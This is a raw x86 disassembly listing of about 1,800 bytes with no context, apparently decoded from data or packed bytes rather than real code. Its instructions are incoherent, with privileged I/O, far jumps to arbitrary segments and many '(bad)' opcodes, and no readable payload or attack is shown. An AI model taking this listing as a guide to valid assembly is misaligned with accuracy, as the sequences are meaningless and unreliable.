  41b49b:	cmp    BYTE PTR ds:0xadc7da2d,cl
  41b4a1:	sbb    DWORD PTR [ecx],ebx
  41b4a3:	or     ah,ch
  41b4a5:	dec    esi
  41b4a6:	jmp    0x41b42a
  41b4a8:	push   bp
  41b4aa:	ins    BYTE PTR es:[edi],dx
  41b4ab:	inc    esp
  41b4ac:	pop    ebx
  41b4ad:	mov    al,ds:0xcbe975db
  41b4b2:	push   esi
  41b4b3:	sub    al,0xa0
  41b4b5:	xlat   BYTE PTR ds:[ebx]
  41b4b6:	les    eax,FWORD PTR [eax-0x8f0afb6]
  41b4bc:	or     dl,BYTE PTR [ebx+ecx*2+0x8dffba2]
  41b4c3:	pop    ebp
  41b4c4:	xchg   DWORD PTR [ecx+0x19],eax
  41b4c7:	push   cs
  41b4c8:	pusha  
  41b4c9:	leave  
  41b4ca:	loop   0x41b450
  41b4cc:	mov    edi,0xd79de56b
  41b4d1:	cld    
  41b4d2:	addr16 push cs
  41b4d4:	loopne 0x41b4fd
  41b4d6:	js     0x41b500
  41b4d8:	dec    ecx
  41b4d9:	ins    BYTE PTR es:[edi],dx
  41b4da:	mov    WORD PTR [ebx],?
  41b4dc:	xchg   DWORD PTR [edi],ebp
  41b4de:	mov    DWORD PTR [edx-0x3c],ebp
  41b4e1:	cmp    dh,ah
  41b4e3:	mov    bl,0x5e
  41b4e5:	into   
  41b4e6:	xchg   bh,ch
  41b4e8:	repnz cmp al,0x65
  41b4eb:	adc    al,BYTE PTR es:[edx+eax*8]
  41b4ef:	in     al,0x6e
  41b4f1:	out    dx,eax
  41b4f2:	in     al,dx
  41b4f3:	add    cl,cl
  41b4f5:	xchg   ecx,eax
  41b4f6:	xchg   DWORD PTR [ecx],edi
  41b4f8:	fstp   TBYTE PTR [edi+0x2d]
  41b4fb:	inc    esp
  41b4fc:	out    dx,al
  41b4fd:	out    0xb8,eax
  41b4ff:	jbe    0x41b57c
  41b501:	jg     0x41b4b2
  41b503:	and    bl,BYTE PTR [esi]
  41b505:	hlt    
  41b506:	cmc    
  41b507:	sbb    DWORD PTR [edi+eiz*8-0x6f],ebx
  41b50b:	jge    0x41b551
  41b50d:	and    BYTE PTR [edx],0x59
  41b510:	adc    dl,dl
  41b512:	test   bh,bl
  41b514:	nop
  41b515:	pusha  
  41b516:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b517:	fldcw  WORD PTR ds:0x54cb6ef4
  41b51d:	sub    eax,0x46e05319
  41b522:	mov    ecx,DWORD PTR [eax+0x55de0178]
  41b528:	and    DWORD PTR [esp+edx*1+0x1f54279],ebx
  41b52f:	dec    edi
  41b530:	jno    0x41b5b0
  41b532:	xor    bh,dh
  41b534:	mov    bh,0x65
  41b536:	fidivr WORD PTR [eax+edi*8]
  41b539:	adc    edx,DWORD PTR [eax]
  41b53b:	sub    BYTE PTR [ecx],ch
  41b53d:	xchg   edi,eax
  41b53e:	mov    BYTE PTR [eax+0x2da6c7d7],cl
  41b544:	xchg   edi,eax
  41b545:	stc    
  41b546:	enter  0xd9f4,0x26
  41b54a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b54b:	push   0x5cfa6fb0
  41b550:	or     al,0xd3
  41b552:	or     eax,0xb58c224b
  41b557:	retf   
  41b558:	mov    BYTE PTR [ebp-0x156bdd04],0x3d
  41b55f:	push   ss
  41b560:	fsubr  QWORD PTR [ecx+0x7a]
  41b563:	inc    esi
  41b564:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b565:	in     eax,0xad
  41b567:	mov    al,0xdf
  41b569:	cdq    
  41b56a:	jmp    0x10be:0x7e1fa8e1
  41b571:	xor    BYTE PTR [edx+0xe],bh
  41b574:	lock mov al,0x36
  41b577:	jns    0x41b52f
  41b579:	mov    al,ds:0x6eb36cee
  41b57e:	mov    al,ds:0xbac81124
  41b583:	je     0x41b5c5
  41b585:	dec    edx
  41b586:	pop    edi
  41b587:	mov    ebp,0x960851c6
  41b58c:	jbe    0x41b563
  41b58e:	test   eax,0x6f005c4b
  41b593:	cs stos DWORD PTR es:[edi],eax
  41b595:	call   0x2f73:0x61b23adf
  41b59c:	rcr    DWORD PTR [esi],cl
  41b59e:	cs es pop edx
  41b5a1:	inc    esp
  41b5a2:	adc    esi,DWORD PTR [edx]
  41b5a4:	int3   
  41b5a5:	or     al,0x34
  41b5a7:	outs   dx,BYTE PTR ds:[esi]
  41b5a8:	in     al,dx
  41b5a9:	add    al,0x4f
  41b5ab:	mov    dh,0xf4
  41b5ad:	outs   dx,DWORD PTR ds:[esi]
  41b5ae:	cmp    ebp,DWORD PTR [edi-0x45425b00]
  41b5b4:	je     0x41b5f1
  41b5b6:	mov    ebx,0x7f5521af
  41b5bb:	dec    edi
  41b5bc:	popf   
  41b5bd:	sub    BYTE PTR [ebx],ch
  41b5bf:	dec    edi
  41b5c0:	pcmpeqb mm6,QWORD PTR [ebp+0x685a53fc]
  41b5c7:	add    DWORD PTR [edi],esp
  41b5c9:	lods   eax,DWORD PTR ds:[esi]
  41b5cb:	stos   DWORD PTR es:[edi],eax
  41b5cc:	outs   dx,DWORD PTR ds:[esi]
  41b5cd:	pop    ebx
  41b5ce:	retf   
  41b5cf:	ficomp DWORD PTR ds:0xb247d8d9
  41b5d5:	cli    
  41b5d6:	sub    BYTE PTR [ebx+0x39bc438f],al
  41b5dc:	sahf   
  41b5dd:	push   edx
  41b5de:	int    0x61
  41b5e0:	push   edi
  41b5e1:	imul   DWORD PTR [edi]
  41b5e3:	fidiv  WORD PTR [ecx-0x21]
  41b5e6:	and    DWORD PTR ds:0x7af3cd6d,esp
  41b5ec:	add    bl,BYTE PTR [ebp+0x65]
  41b5ef:	es int3 
  41b5f1:	adc    edi,DWORD PTR [ebx]
  41b5f3:	idiv   DWORD PTR [edi-0x7c]
  41b5f6:	xor    esi,ebx
  41b5f8:	adc    BYTE PTR [edx+edx*8+0x1110ca9a],0xc1
  41b600:	jecxz  0x41b59e
  41b602:	test   eax,0x26981bf4
  41b607:	pop    ds
  41b608:	sahf   
  41b609:	iret   
  41b60a:	out    dx,al
  41b60b:	out    dx,eax
  41b60c:	jle    0x41b5c6
  41b60e:	gs stc 
  41b610:	pop    ebp
  41b611:	sbb    DWORD PTR [esp+ebx*2-0x12],edi
  41b615:	push   edx
  41b616:	add    al,0x9d
  41b618:	jg     0x41b699
  41b61a:	cdq    
  41b61b:	repz or DWORD PTR [ecx-0x2585ed10],eax
  41b622:	cmp    ch,bh
  41b624:	pop    ds
  41b625:	jecxz  0x41b647
  41b627:	sar    BYTE PTR [ebx],cl
  41b629:	(bad)  
  41b62a:	jge    0x41b618
  41b62c:	fadd   DWORD PTR [ebx+eiz*8+0x23bd7b0b]
  41b633:	xor    ebx,DWORD PTR [ebx]
  41b635:	es loop 0x41b69c
  41b638:	add    al,0x4
  41b63a:	pop    esi
  41b63b:	outs   dx,DWORD PTR ds:[esi]
  41b63c:	push   ebx
  41b63d:	or     BYTE PTR [edi+0x41338b15],dl
  41b643:	shl    DWORD PTR [edi],1
  41b645:	popf   
  41b646:	in     al,dx
  41b647:	pop    esi
  41b648:	push   ss
  41b649:	loopne 0x41b690
  41b64b:	arpl   WORD PTR ds:[edx-0x78],dx
  41b64f:	inc    ebp
  41b650:	test   al,0xa4
  41b652:	or     DWORD PTR [esp+ebp*4],0x8dca65f3
  41b659:	adc    eax,0x3825e52d
  41b65e:	xchg   esi,eax
  41b65f:	lahf   
  41b660:	pop    ss
  41b661:	and    bl,bl
  41b663:	inc    esi
  41b664:	push   cs
  41b665:	xchg   esp,eax
  41b666:	mov    DWORD PTR [edi+ecx*1-0x39],ecx
  41b66a:	ror    ebp,cl
  41b66c:	div    ah
  41b66e:	ret    0x3dfd
  41b671:	fistp  DWORD PTR [esi+0x6a]
  41b674:	jbe    0x41b60d
  41b676:	mov    ah,0x1e
  41b678:	mov    ecx,0xe0d506f2
  41b67d:	add    al,0x22
  41b67f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b680:	into   
  41b681:	mov    ebp,0x21b93465
  41b686:	dec    esi
  41b687:	cs es enter 0x4f2c,0x26
  41b68d:	repnz loop 0x41b670
  41b690:	sbb    ecx,esi
  41b692:	xor    DWORD PTR [edi-0x11552ef3],ebp
  41b698:	mov    al,0xa6
  41b69a:	push   0xffffff8d
  41b69c:	retf   
  41b69d:	and    ebp,DWORD PTR ss:0x4dea872c
  41b6a4:	or     BYTE PTR [edi-0x16],dl
  41b6a7:	out    dx,al
  41b6a8:	jae    0x41b6d9
  41b6aa:	(bad)  
  41b6ab:	(bad)  
  41b6ac:	in     al,dx
  41b6ad:	sub    edx,DWORD PTR [ecx+0x79]
  41b6b0:	(bad)  
  41b6b1:	outs   dx,BYTE PTR ds:[esi]
  41b6b2:	out    dx,al
  41b6b3:	inc    al
  41b6b5:	mov    ah,0x3d
  41b6b7:	ror    dh,0x1b
  41b6ba:	js     0x41b6f4
  41b6bc:	add    DWORD PTR [esi+ebx*4],ecx
  41b6bf:	jmp    0xce4bc476
  41b6c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b6c5:	dec    esi
  41b6c6:	and    DWORD PTR [ebp-0x48],esi
  41b6c9:	loopne 0x41b65a
  41b6cb:	and    eax,0xc882855
  41b6d0:	shl    DWORD PTR [ecx-0x4844d96b],0x4b
  41b6d7:	mov    ecx,0xcf97358b
  41b6dc:	push   esp
  41b6dd:	in     al,dx
  41b6de:	pop    es
  41b6df:	pop    eax
  41b6e0:	test   al,0xa3
  41b6e2:	(bad)  
  41b6e3:	outs   dx,BYTE PTR ds:[esi]
  41b6e4:	in     eax,0xb2
  41b6e6:	pop    ecx
  41b6e7:	inc    ebp
  41b6e8:	xchg   edi,eax
  41b6e9:	push   eax
  41b6ea:	pop    esp
  41b6eb:	shr    DWORD PTR [ecx+0xdb438e7],cl
  41b6f1:	or     ecx,esi
  41b6f3:	jns    0x41b6d0
  41b6f5:	cld    
  41b6f6:	clc    
  41b6f7:	inc    edx
  41b6f8:	jbe    0x41b72b
  41b6fa:	sub    BYTE PTR [eax+0x5e],bh
  41b6fd:	aas    
  41b6fe:	xor    al,0x96
  41b700:	jae    0x41b76c
  41b702:	mov    esi,0xb70cc49c
  41b707:	inc    ebp
  41b708:	aad    0x4d
  41b70a:	lods   eax,DWORD PTR ds:[esi]
  41b70b:	aas    
  41b70c:	inc    esp
  41b70d:	or     BYTE PTR [edx+0x3e],dh
  41b710:	hlt    
  41b711:	popf   
  41b712:	xlat   BYTE PTR ds:[ebx]
  41b713:	mov    ecx,es
  41b715:	mov    ebp,0x299f18fc
  41b71a:	loopne 0x41b6ee
  41b71c:	sub    eax,0x9bc33696
  41b721:	ret    
  41b722:	jmp    0x41b6f7
  41b724:	and    BYTE PTR [edx+0x45],dh
  41b727:	cmp    BYTE PTR [esi+0x35],dl
  41b72a:	and    al,0x12
  41b72c:	mul    DWORD PTR [ebx-0x2bdc74f1]
  41b732:	mov    al,0x18
  41b734:	push   cs
  41b735:	push   ebp
  41b736:	cmp    cl,al
  41b738:	loope  0x41b750
  41b73a:	xchg   esi,eax
  41b73b:	dec    edi
  41b73c:	rcl    bh,1
  41b73e:	test   al,0x76
  41b740:	push   esp
  41b741:	iret   
  41b742:	fld    QWORD PTR [eax+edx*2-0x6a595b94]
  41b749:	(bad)  
  41b74b:	inc    edx
  41b74c:	or     eax,0xef6ffb3a
  41b751:	or     DWORD PTR [edx],ebx
  41b753:	jno    0x41b75f
  41b755:	cmp    al,0x83
  41b757:	pushf  
  41b758:	sbb    eax,DWORD PTR [esi]
  41b75a:	cdq    
  41b75b:	jl     0x41b760
  41b75d:	shr    DWORD PTR [edx-0x34bdc211],cl
  41b763:	arpl   WORD PTR [ebp-0x4b],dx
  41b766:	pop    edx
  41b767:	jne    0x41b71a
  41b769:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b76a:	cmp    al,0xeb
  41b76c:	lds    edi,FWORD PTR ss:[eax+edi*8+0x68]
  41b771:	rcr    BYTE PTR [esi+0x43],1
  41b774:	mov    esp,0x3b0d4f34
  41b779:	sbb    edx,edx
  41b77b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b77c:	hlt    
  41b77d:	aas    
  41b77e:	push   0xf
  41b780:	pop    esi
  41b781:	cmp    ebx,ebx
  41b783:	sbb    al,0x69
  41b785:	xchg   DWORD PTR [eax+ebp*1+0x1a],esi
  41b789:	push   edi
  41b78a:	out    dx,eax
  41b78b:	pushf  
  41b78c:	xlat   BYTE PTR ds:[ebx]
  41b78d:	hlt    
  41b78e:	fld    DWORD PTR [edx-0x3b]
  41b791:	push   edx
  41b792:	xchg   DWORD PTR [ebx-0x53],ebp
  41b795:	jb     0x41b739
  41b797:	and    bh,bh
  41b799:	pop    ebx
  41b79a:	and    DWORD PTR [edx-0x2],0x4a
  41b79e:	test   BYTE PTR [ebx-0x3395c859],al
  41b7a4:	clc    
  41b7a5:	cli    
  41b7a6:	sbb    eax,0x297ed1a3
  41b7ab:	jne    0x41b81a
  41b7ad:	mov    al,0xc5
  41b7af:	fsubr  QWORD PTR [ecx+0x4b]
  41b7b2:	inc    edi
  41b7b3:	aad    0x9c
  41b7b5:	in     al,dx
  41b7b6:	sti    
  41b7b7:	or     ebx,DWORD PTR [ebx-0x291cb40e]
  41b7bd:	sti    
  41b7be:	adc    al,0x5a
  41b7c0:	outs   dx,BYTE PTR ds:[esi]
  41b7c1:	push   0xb881a60
  41b7c6:	out    0x3f,al
  41b7c8:	push   0xffffffd6
  41b7ca:	repnz and ebp,DWORD PTR [edi]
  41b7cd:	cmp    BYTE PTR [edi],al
  41b7cf:	mov    ds:0x4b13e546,al
  41b7d4:	bound  esp,QWORD PTR [ecx+edx*8-0x2f]
  41b7d8:	mov    esp,0xe4220aaa
  41b7dd:	sub    al,0x73
  41b7df:	repnz and DWORD PTR [bx+si+0x1510],ebp
  41b7e5:	and    bh,BYTE PTR [esi]
  41b7e7:	and    al,bl
  41b7e9:	xor    al,BYTE PTR [esi+eax*4-0x65e95ed2]
  41b7f0:	(bad)
  41b7f4:	dec    eax
  41b7f5:	les    bp,DWORD PTR ds:0x1726d3c2
  41b7fc:	dec    DWORD PTR [esi+0x2cd47a1d]
  41b802:	xchg   ebp,eax
  41b803:	es fmul st(0),st
  41b806:	stos   BYTE PTR es:[edi],al
  41b807:	adc    ecx,DWORD PTR [esi]
  41b809:	aaa    
  41b80a:	loope  0x41b830
  41b80c:	loop   0x41b7a7
  41b80e:	lods   eax,DWORD PTR ds:[esi]
  41b80f:	mov    ah,BYTE PTR [eax-0x751fc2d7]
  41b815:	psrlw  mm2,mm2
  41b818:	outs   dx,BYTE PTR ds:[esi]
  41b819:	out    0x57,eax
  41b81b:	add    BYTE PTR [edi+0x154a6f8a],ah
  41b821:	test   eax,0x49ee2a29
  41b826:	sbb    eax,0xda9df37b
  41b82b:	jo     0x41b84b
  41b82d:	out    0xef,al
  41b82f:	call   0x3866233a
  41b834:	sbb    eax,DWORD PTR ds:0x52f3142f
  41b83a:	mov    eax,0xee53b5c4
  41b83f:	jp     0x41b84a
  41b841:	test   DWORD PTR [esi-0x44],ebp
  41b844:	mov    edx,0xf543ce15
  41b849:	lds    ebx,FWORD PTR [esi-0x3f]
  41b84c:	jno    0x41b81c
  41b84e:	pop    ecx
  41b84f:	inc    edx
  41b850:	inc    ebp
  41b851:	lock sar BYTE PTR [esi],1
  41b854:	cld    
  41b855:	dec    ebx
  41b856:	dec    ebp
  41b857:	mov    ds:0x5d8f21a2,al
  41b85c:	jg     0x41b88e
  41b85e:	mov    dl,0xd6
  41b860:	lds    eax,FWORD PTR [ebx+eiz*2+0x4c558858]
  41b867:	enter  0x5290,0x87
  41b86b:	and    ch,BYTE PTR [esi+0x7]
  41b86e:	outs   dx,BYTE PTR ds:[esi]
  41b86f:	imul   esp,DWORD PTR [ecx+0x49d7dc16],0xffffff8d
  41b876:	sar    DWORD PTR [eax],0x77
  41b879:	cmc    
  41b87a:	or     ah,cl
  41b87c:	dec    eax
  41b87d:	xor    al,0x6a
  41b87f:	repnz outs dx,DWORD PTR ds:[esi]
  41b881:	and    esi,DWORD PTR [esi-0x47de7e31]
  41b887:	xchg   DWORD PTR [esi],eax
  41b889:	mov    esp,0x243edaee
  41b88e:	or     DWORD PTR [ebp-0x55fbc5e1],ebp
  41b894:	pop    esp
  41b895:	fisubr WORD PTR [ebp+0x124406a2]
  41b89b:	jl     0x41b844
  41b89d:	mov    al,ds:0x144d6ac9
  41b8a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b8a3:	jnp    0x41b8d7
  41b8a5:	sbb    al,0x3d
  41b8a7:	mov    cl,0x37
  41b8a9:	repz mov al,ds:0x47ffcb60
  41b8af:	cwde   
  41b8b0:	push   0xbe128b4f
  41b8b5:	inc    eax
  41b8b6:	div    dl
  41b8b8:	add    DWORD PTR [eax+0x4a0b6d9c],ebp
  41b8be:	inc    eax
  41b8bf:	lock (bad) 
  41b8c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b8c2:	sub    eax,0xc7b11b3d
  41b8c7:	jo     0x41b88d
  41b8c9:	sbb    esp,DWORD PTR [ebp-0x5e]
  41b8cc:	mov    ebp,0xef8dced3
  41b8d1:	and    al,0x90
  41b8d3:	xor    edx,DWORD PTR [ecx-0x71c55f1c]
  41b8d9:	sbb    cl,ch
  41b8db:	mov    esp,DWORD PTR [esi]
  41b8dd:	push   cs
  41b8de:	jmp    0x959e:0xf83bc83f
  41b8e5:	dec    ecx
  41b8e6:	pop    eax
  41b8e7:	mov    dl,0xc3
  41b8e9:	imul   ebp,DWORD PTR [eax-0x5966e71d],0x6f
  41b8f0:	sub    bh,BYTE PTR [ecx]
  41b8f2:	pcmpgtw mm2,QWORD PTR [ecx-0x20]
  41b8f6:	xor    al,0x8b
  41b8f8:	or     ebx,DWORD PTR [ebx-0x3c]
  41b8fb:	inc    eax
  41b8fc:	inc    ecx
  41b8fd:	fidiv  DWORD PTR [ebx-0x3d]
  41b900:	push   ecx
  41b901:	dec    esi
  41b902:	repnz dec esp
  41b904:	push   ds
  41b905:	xchg   edx,eax
  41b906:	repz push edx
  41b908:	push   ebx
  41b909:	lea    edi,[esi+0x15c4d261]
  41b90f:	dec    esp
  41b910:	sbb    al,0x5f
  41b912:	sti    
  41b913:	jo     0x41b8bd
  41b915:	fmul   DWORD PTR [edx-0x24]
  41b918:	aad    0x7a
  41b91a:	data16 xor dh,BYTE PTR [ebp-0x4d]
  41b91e:	jns    0x41b99d
  41b920:	iret   
  41b921:	pop    edx
  41b922:	cs ret 0x6512
  41b926:	sbb    BYTE PTR [edx],0xfd
  41b929:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b92a:	push   0x3
  41b92c:	or     eax,0x495233f5
  41b931:	add    cl,dh
  41b933:	fadd   st,st(6)
  41b935:	xlat   BYTE PTR ds:[ebx]
  41b936:	je     0x41b99a
  41b938:	cld    
  41b939:	mov    ah,BYTE PTR [ebx]
  41b93b:	xor    esp,DWORD PTR [ecx]
  41b93d:	leave  
  41b93e:	xor    eax,0x160f5461
  41b943:	lea    edi,[edi]
  41b945:	(bad)  
  41b946:	pop    esp
  41b947:	mov    cl,BYTE PTR [esi]
  41b949:	jp     0x41b98c
  41b94b:	fadd   st,st(5)
  41b94d:	push   edi
  41b94e:	mov    ds:0x395d180d,al
  41b953:	out    0x16,eax
  41b955:	xchg   esp,eax
  41b956:	sbb    DWORD PTR cs:[esi+0x1b],esi
  41b95a:	inc    ecx
  41b95b:	adc    al,0xd8
  41b95d:	push   cs
  41b95e:	mov    eax,cs
  41b960:	push   ecx
  41b961:	jae    0x41b99e
  41b963:	inc    edx
  41b964:	xlat   BYTE PTR ds:[ebx]
  41b965:	into   
  41b966:	arpl   bx,bp
  41b968:	cmc    
  41b969:	jo     0x41b90d
  41b96b:	in     eax,dx
  41b96c:	outs   dx,BYTE PTR ds:[esi]
  41b96d:	add    al,0xcc
  41b96f:	sub    bh,BYTE PTR [edi-0x47b3c7bb]
  41b975:	push   edx
  41b976:	sub    al,0x8e
  41b978:	dec    ecx
  41b979:	push   ss
  41b97a:	xacquire xchg BYTE PTR ds:0x3e690ab2,dl
  41b981:	jne    0x41b9e0
  41b983:	inc    edx
  41b984:	push   edi
  41b985:	stc    
  41b986:	in     eax,dx
  41b987:	cmp    BYTE PTR [esi-0x33],dh
  41b98a:	call   0xb2b7922e
  41b98f:	dec    ecx
  41b990:	pop    edx
  41b991:	jg     0x41b931
  41b993:	dec    edi
  41b994:	lods   eax,DWORD PTR ds:[esi]
  41b995:	or     DWORD PTR [ebp+0x15],esi
  41b998:	cmp    al,0xa4
  41b99a:	and    bl,BYTE PTR [edi+0x2727e2b3]
  41b9a0:	adc    al,0xed
  41b9a2:	aam    0x85
  41b9a4:	shl    DWORD PTR [ebp+ebp*4-0x58c9f8b3],0x9b
  41b9ac:	add    eax,0x998da724
  41b9b1:	sbb    DWORD PTR [ecx],esp
  41b9b3:	rcr    BYTE PTR [esi+0x41efa730],cl
  41b9b9:	pusha  
  41b9ba:	popf   
  41b9bb:	(bad)  
  41b9bc:	jb     0x41b9e5
  41b9be:	mov    bh,0xb2
  41b9c0:	fsubr  st(6),st
  41b9c2:	mov    DWORD PTR [edx],ecx
  41b9c4:	in     al,dx
  41b9c5:	and    al,0x3a
  41b9c7:	inc    eax
  41b9c8:	enter  0x21ef,0xc2
  41b9cc:	dec    edi
  41b9cd:	jge    0x41b9b0
  41b9cf:	ret    
  41b9d0:	xor    dh,BYTE PTR [ecx]
  41b9d2:	xor    cl,BYTE PTR [ebx+0x19f45fd1]
  41b9d8:	(bad)
  41b9db:	sahf   
  41b9dc:	mov    ds,WORD PTR [esi+0x5ac3b751]
  41b9e2:	pop    edx
  41b9e3:	fcomp  DWORD PTR [bx+si]
  41b9e6:	test   BYTE PTR [esi+0x27],dh
  41b9e9:	and    DWORD PTR [ebx+ecx*1+0x73],esi
  41b9ed:	sahf   
  41b9ee:	imul   eax,DWORD PTR [edx-0x3a],0x47
  41b9f2:	mov    dh,BYTE PTR [eax-0x599524cd]
  41b9f8:	sub    al,dl
  41b9fa:	dec    esp
  41b9fb:	lds    esp,FWORD PTR [edi+0x7a]
  41b9fe:	jbe    0x41ba7d
  41ba00:	into   
  41ba01:	xchg   ebx,eax
  41ba02:	mov    cs,WORD PTR [esi-0x762c2ad4]
  41ba08:	loope  0x41ba24
  41ba0a:	pusha  
  41ba0b:	int    0x1a
  41ba0d:	pop    esp
  41ba0e:	es pop ebx
  41ba10:	mov    ebp,0x312d4a3c
  41ba15:	adc    ebp,DWORD PTR [edi+0x5b]
  41ba18:	add    BYTE PTR [edi],al
  41ba1a:	sti    
  41ba1b:	retf   0xe340
  41ba1e:	dec    edx
  41ba1f:	push   es
  41ba20:	lods   eax,DWORD PTR ds:[esi]
  41ba21:	lahf   
  41ba22:	ficomp DWORD PTR [edx-0x38]
  41ba25:	scas   al,BYTE PTR es:[edi]
  41ba26:	pop    edi
  41ba27:	ficom  WORD PTR [edi+0x6a]
  41ba2a:	ror    dh,cl
  41ba2c:	call   0xc5de:0x57a77058
  41ba33:	mov    WORD PTR [eax-0x7a],cs
  41ba36:	ins    DWORD PTR es:[edi],dx
  41ba37:	test   eax,0x70b435dd
  41ba3c:	or     esi,edx
  41ba3e:	dec    esi
  41ba3f:	mov    al,ds:0x29fe4197
  41ba44:	inc    ebx
  41ba45:	push   ebx
  41ba46:	push   ecx
  41ba47:	dec    eax
  41ba48:	dec    ecx
  41ba49:	and    ebx,DWORD PTR [esi]
  41ba4b:	xor    DWORD PTR [ecx],ebx
  41ba4d:	jg     0x41b9f9
  41ba4f:	lahf   
  41ba50:	jp     0x41ba7b
  41ba52:	dec    eax
  41ba53:	jmp    0xb40ca47d
  41ba58:	addr16 mov dh,ch
  41ba5b:	xchg   esp,eax
  41ba5c:	push   ebp
  41ba5d:	sbb    bl,bl
  41ba5f:	stos   BYTE PTR es:[edi],al
  41ba60:	in     eax,0xa1
  41ba62:	lea    edx,[ebp-0xab18f26]
  41ba68:	sub    eax,0x8d168c4d
  41ba6d:	push   esp
  41ba6e:	cdq    
  41ba6f:	pop    ebp
  41ba70:	sub    edx,DWORD PTR [ecx]
  41ba72:	dec    edi
  41ba73:	shl    DWORD PTR [esi+0x6a],cl
  41ba76:	xchg   ebx,eax
  41ba77:	xchg   edx,eax
  41ba78:	push   ds
  41ba79:	aaa    
  41ba7a:	mov    ah,BYTE PTR [esi+0x3c9d39d4]
  41ba80:	push   cs
  41ba81:	inc    esi
  41ba82:	(bad)  
  41ba83:	mov    DWORD PTR [bp-0x56b7],ebx
  41ba88:	test   DWORD PTR [edx+0x33243531],esi
  41ba8e:	or     al,0xd5
  41ba90:	add    eax,0xcfcb2708
  41ba95:	adc    al,0x34
  41ba97:	xchg   bh,ah
  41ba99:	jo     0x41bb09
  41ba9b:	iret   
  41ba9c:	adc    BYTE PTR fs:[edi-0x7d],0xf0
  41baa1:	sbb    al,0x8c
  41baa3:	add    BYTE PTR [ebx+0x43],al
  41baa6:	dec    edi
  41baa7:	ss mov dl,0x56
  41baaa:	jne    0x41ba32
  41baac:	jp     0x41bb1e
  41baae:	les    edx,FWORD PTR [ecx+0x2c]
  41bab1:	and    BYTE PTR [ebp+0x7463af06],0xb4
  41bab8:	cli    
  41bab9:	(bad)  
  41babb:	mov    eax,0x774da304
  41bac0:	xor    ebp,ebp
  41bac2:	ins    BYTE PTR es:[edi],dx
  41bac3:	call   0x7e6b:0x5d59b45b
  41baca:	or     DWORD PTR [eax+edi*1],ecx
  41bacd:	jmp    0x9071375a
  41bad2:	cs test al,0x3a
  41bad5:	xchg   ebx,eax
  41bad6:	clc    
  41bad7:	enter  0xd7ee,0x55
  41badb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41badc:	ds dec ebp
  41bade:	and    eax,0xd6f8236e
  41bae3:	or     DWORD PTR [ebx-0x3a972911],edx
  41bae9:	mov    edx,0xb1e51fb
  41baee:	imul   ebx,DWORD PTR [edi+0x4e78c80e],0x46421b05
  41baf8:	jle    0x41baf8
  41bafa:	mov    al,0x7a
  41bafc:	shl    BYTE PTR [ebx-0x27],1
  41baff:	das    
  41bb00:	(bad)  
  41bb01:	imul   DWORD PTR [ebx+0x78283aeb]
  41bb07:	in     al,0x22
  41bb09:	xchg   edx,eax
  41bb0a:	inc    edx
  41bb0b:	sub    esp,DWORD PTR [edx+edx*4]
  41bb0e:	push   esi
  41bb0f:	jbe    0x41bb88
  41bb11:	xor    al,0x6c
  41bb13:	sbb    DWORD PTR [ebx],edi
  41bb15:	mov    ebx,0x6b85fa27
  41bb1a:	push   edi
  41bb1b:	ret    
  41bb1c:	loop   0x41bac2
  41bb1e:	mov    esp,0x2ce2d4e8
  41bb23:	or     ebx,DWORD PTR [edx-0x64]
  41bb26:	ja     0x41bad6
  41bb28:	pop    ss
  41bb29:	or     eax,0x3b4f4e06
  41bb2e:	push   ebx
  41bb2f:	jo     0x41bb8b
  41bb31:	cld    
  41bb32:	add    ah,0xdb
  41bb35:	retf   0x5895
  41bb38:	jmp    0xa3ac1a67
  41bb3d:	aaa    
  41bb3e:	into   
  41bb3f:	jbe    0x41bbab
  41bb41:	mov    al,0x85
  41bb43:	pop    eax
  41bb44:	mov    ebx,0xa9f5fac6
  41bb49:	das    
  41bb4a:	cli    
  41bb4b:	popa   
  41bb4c:	pop    ds
  41bb4d:	sbb    DWORD PTR [eax],0x1c
  41bb50:	xchg   esp,eax
  41bb51:	in     eax,dx
  41bb52:	(bad)  
  41bb54:	jmp    0xa0faaefe
  41bb59:	(bad)  
  41bb5a:	fistp  WORD PTR [esi-0x62]
  41bb5d:	inc    esi
  41bb5e:	and    DWORD PTR [ecx+edi*4+0x6036f484],0xc0c75e5
  41bb69:	cdq    
  41bb6a:	add    al,0x80
  41bb6c:	mov    ebx,0x2d54a960
  41bb71:	jl     0x41bb0c
  41bb73:	dec    edx
  41bb74:	loop   0x41bb44
  41bb76:	(bad)  [ebp-0x296a2b4b]
  41bb7c:	push   edx
  41bb7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb7e:	int3   
  41bb7f:	cwde   
  41bb80:	xor    bl,al
  41bb82:	push   es
  41bb83:	inc    ebx
  41bb84:	cmp    eax,0xb71309b4
  41bb89:	jnp    0x41bb1a
  41bb8b:	cmp    BYTE PTR [ebp-0x7841da74],al
  41bb91:	cdq    
  41bb92:	and    eax,0xf413e2c3
  41bb97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb98:	test   DWORD PTR [edx-0x54],0x78e28512
  41bb9f:	es jnp 0x41bbc9
  41bba2:	jne    0x41bc06
  41bba4:	ja     0x41bb7b
  41bba6:	jns    0x41bbdf
  41bba8:	(bad)  
  41bba9:	pop    edx
  41bbaa:	xchg   ecx,eax
  41bbab:	iret   
  41bbac:	or     DWORD PTR [eax],ebx
  41bbae:	pop    ebx
  41bbaf:	cmp    edi,DWORD PTR [ebp-0x3c]
  41bbb2:	fld    QWORD PTR [eax+0x61]
  41bbb5:	(bad)  
  41bbb6:	xor    al,0x38
  41bbb8:	mov    ebx,0x122527ed
  41bbbd:	lea    ebx,[esi-0x21b1166c]
  41bbc3:	push   ecx
  41bbc4:	mov    esi,0x2dea627a
  41bbc9:	sbb    al,0x41
  41bbcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bbcc:	xlat   BYTE PTR ds:[ebx]
  41bbcd:	data16 jg 0x41bbda
  41bbd0:	adc    ah,BYTE PTR [edx+0x2e]
